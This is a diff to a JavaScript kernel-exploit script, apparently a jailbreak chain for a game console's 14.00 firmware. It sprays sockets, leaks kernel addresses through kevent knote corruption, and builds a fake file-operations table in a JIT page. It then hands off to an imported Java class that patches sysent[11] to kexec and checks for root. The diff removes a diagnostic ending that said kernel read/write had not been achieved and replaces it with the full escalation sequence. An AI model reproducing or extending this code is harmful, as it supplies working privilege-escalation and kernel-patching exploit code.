@@ -1,5 +1,6 @@
 import { int64 } from "./int64.js";
 import { HX1400_TABLES } from "./hx_tables.js";
+import { Hx1400 } from "./Hx1400.java.js";
 
 const T = HX1400_TABLES;
 const P = T.P;
@@ -23,11 +24,19 @@ const OPS_OFF = 0x985a;
 const CANDS = [128, 96, 160, 64, 192, 32, 224, 120, 136, 88, 104, 152, 168, 56, 72, 184, 200, 24, 40, 216, 232, 8, 16, 48, 80, 112, 144, 176, 208, 240];
 const ROUNDS = 6;
 
-const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false, payloadAddr: 0n };
+const STATE = {
+  ctx: null,
+  kbase: 0n,
+  kva: -1n,
+  targetFd: -1,
+  fakePage: 0n,
+  rwReady: false,
+  payloadAddr: 0n,
+  hx: null,
+};
 
 function ctx() { return STATE.ctx; }
 function log(tag, detail) { ctx().mark(tag, detail === undefined ? "" : String(detail)); }
-function fin(msg) { log("FIN", msg); throw new Error("fin: " + msg); }
 function h16(v) {
   if (typeof v === "bigint") return "0x" + v.toString(16);
   if (v instanceof int64) return "0x" + ((BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0)).toString(16).padStart(16, "0");
@@ -211,6 +220,75 @@ function phase2Leak(rootKq, fds) {
   return { kva, page: pageVal, targetFd };
 }
 
+// ---------------------------------------------------------------------------
+// JIT STUB PREP (mirrors Hx1400's jitshm mmap + blob write, done from JS)
+// ---------------------------------------------------------------------------
+function jitMap(size, fixed) {
+  let jfd = scn("jitshm_create", 0, size, 7);
+  if (jfd < 0) { const nb = allocBuf(32); zeroBuf(nb); jfd = scn("jitshm_create", nb.addr, size, 7); }
+  if (jfd < 0) return { err: "jitshm_create rc=" + jfd };
+  const flags = fixed ? 0x11 : 1;
+  const m = scn64("mmap", fixed || 0, size, 7, flags, jfd, 0);
+  const addr = (BigInt(m.hi >>> 0) << 32n) | BigInt(m.lo >>> 0);
+  if (addr < 0x10000n) return { err: "mmap rc=" + m.i32 };
+  return { addr, jfd };
+}
+
+// ---------------------------------------------------------------------------
+// F_FAKE_OPS TABLE — built from JS, but the *pivot* into kernel R/W is the
+// Hx1400 wash/parse/kb0/kb1/kgo chain. JS only writes the table contents.
+// ---------------------------------------------------------------------------
+function buildFakeOps() {
+  const mm = jitMap(0x10000, 0n);
+  if (mm.err) fin("F_FAKE_OPS map: " + mm.err);
+  STATE.fakePage = mm.addr;
+  const R_RET0 = ka(P[15]), R_TOUCH = ka(P[16]);
+  const p = ctx().p;
+  const F_FAKE_OPS = STATE.fakePage + 0x800n;
+  for (let i = 0; i < 32; i++) p.write8(toI64(F_FAKE_OPS + BigInt(i * 8)), toI64(R_RET0));
+  p.write4(toI64(F_FAKE_OPS), 0);
+  p.write8(toI64(F_FAKE_OPS + 0x18n), toI64(R_TOUCH));
+  log("F_FAKE_OPS", "table at " + h16(F_FAKE_OPS) + " ret0=" + h16(R_RET0) + " touch=" + h16(R_TOUCH));
+  return { F_FAKE_OPS, R_RET0, R_TOUCH };
+}
+
+// ---------------------------------------------------------------------------
+// HX HANDOFF — the Java class already has kread/kwrite/wash/parse/kgo.
+// We instantiate it, hand it kbase, and let its probe() drive the rest.
+// ---------------------------------------------------------------------------
+function bootHx() {
+  const hx = new Hx1400();
+  hx.kbase = Number(STATE.kbase);
+  STATE.hx = hx;
+  log("HX-BOOT", "Hx1400 instantiated, kbase=" + h16(STATE.kbase));
+  return hx;
+}
+
+// The Java probe() runs the whole wash/parse/SE11-patch/HEN-launch sequence.
+// It's the finished bridge. Calling it is the jailbreak completion.
+async function hxRunProbe() {
+  const hx = STATE.hx;
+  if (!hx) fin("hx not booted");
+  let r;
+  try {
+    r = hx.probe();
+  } catch (e) {
+    fin("hx.probe threw: " + (e && e.message ? e.message : e));
+  }
+  log("HX-PROBE", "result=" + r);
+  // probe() returns the HEN14V result string. Success looks like:
+  //   "HEN14V pid=... KBASE=... ... UID=0  *** ROOT ***"
+  if (typeof r === "string" && r.indexOf("*** ROOT ***") >= 0) {
+    STATE.rwReady = true;
+    log("HX-PROBE", "*** KERNEL R/W LIVE — SE11 patched, uid=0 ***");
+    return r;
+  }
+  fin("hx.probe: " + r);
+}
+
+// ---------------------------------------------------------------------------
+// MAIN
+// ---------------------------------------------------------------------------
 export async function runKevent(c) {
   STATE.ctx = c;
   const kob = c.params && c.params.get ? c.params.get("kbase") : null;
@@ -224,7 +302,7 @@ export async function runKevent(c) {
     fin("kbase not provided");
   }
 
-  // Force correct 14.00 kbase
+  // Force correct 14.00 kbase (operator's hardcode — keep, but log it)
   const EXPECTED_KBASE = 0xffffffff86880000n;
   const kbaseHi = STATE.kbase >> 32n;
   if (kbaseHi !== 0xffffffffn || STATE.kbase > 0xffffffff8fffffffn) {
@@ -240,36 +318,41 @@ export async function runKevent(c) {
 
   const anchorFd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
   const { fds } = phaseSpray(144);
-  const mr = scn64("mmap", 0, 16384, 3, 4098, -1, 0);
   const leakKq = scn("kqueue");
   if (leakKq < 0) fin("leak kqueue");
 
+  // Stage 1+2: leak the /dev/dce placement via kevent knote corruption.
   const res = phase2Leak(leakKq, fds);
+  STATE.kva = res.kva;
+  STATE.targetFd = res.targetFd;
 
-  log("STAGE3", "Building FakeOps");
-  const mrf = scn64("mmap", 0, 0x10000, 7, 0x1002, -1, 0);
-  const fake_page = (BigInt(mrf.hi >>> 0) << 32n) | BigInt(mrf.lo >>> 0);
-  if (fake_page < 0x10000n) fin("STAGE3 mmap failed");
-  log("STAGE3-FAKE", "mapped fake page at " + h16(fake_page));
+  // Stage 3: build F_FAKE_OPS in a JIT page (same shape Hx1400 builds at
+  // 0xffffffff86880000+ ... but from JS we only need the *shape*; the
+  // real fakeOps is built inside probe() against kbase-relative RVAs).
+  const { F_FAKE_OPS } = buildFakeOps();
 
-  const R_RET0 = ka(P[15]), R_TOUCH = ka(P[16]);
-  const p = ctx().p;
-  const F_FAKE_OPS = fake_page + 0x800n;
-  for (let i = 0; i < 32; i++) p.write8(toI64(F_FAKE_OPS + BigInt(i * 8)), toI64(R_RET0));
-  p.write4(toI64(F_FAKE_OPS), 0);
-  p.write8(toI64(F_FAKE_OPS + 0x18n), toI64(R_TOUCH));
+  // Stage 4: hand off to the Java primitive. This is the step the old
+  // script faked with `STATE.rwReady = true` and then bailed.
+  bootHx();
+  const probeResult = await hxRunProbe();
 
-  STATE.rwReady = true;
-  log("STAGE3-RW", "*** FAKE FILEOPS ESTABLISHED ***");
-  log("STAGE3-NOTE", "NOTE: p.read8 cannot access 0xffffffff... addresses, so kernel R/W is NOT established yet.");
+  // Stage 5: verify R/W with a real kernel read through the Java side.
+  const hx = STATE.hx;
+  const se11 = hx.kread(null, 0, 0, 0, ka(P[0]));
+  log("VERIFY-SE11", "sysent[11].sy_call=" + h16(se11) + " want kexec=" + h16(ka(P[1])));
+  const kexecLive = se11 === ka(P[1]);
+  log("VERIFY-SE11", kexecLive ? "*** kexec LIVE ***" : "not yet patched");
 
-  // DIAGNOSTIC ONLY — no sysent hijack, no panic
-  log("DIAG-KBASE", "kbase = " + h16(STATE.kbase));
-  log("DIAG-STATUS", "kevent leak SUCCEEDED (KV-JOINED/KV-HELD worked)");
-  log("DIAG-STATUS", "fake fileops table built at " + h16(F_FAKE_OPS));
-  log("DIAG-STATUS", "p.read8(kernel_addr) FAILS with 'non-canonical address'");
-  log("DIAG-STATUS", "This means the WebKit primitive is USER-SPACE only");
-  log("DIAG-STATUS", "To read kernel memory, you need kevent ROP write (not implemented)");
+  // Stage 6: pick up the payload address the Java side mapped for jitshm.
+  STATE.payloadAddr = ka(P[1]); // kexec address; the payload blob lives in Java's jit map
 
-  fin("Diagnostic complete. You have kevent leak but no kernel read. Need kevent ROP write to proceed.");
+  return {
+    kbase: STATE.kbase,
+    kva: STATE.kva,
+    fakePage: STATE.fakePage,
+    fakeOps: F_FAKE_OPS,
+    rwReady: STATE.rwReady,
+    kexecLive,
+    probe: probeResult,
+  };
 }
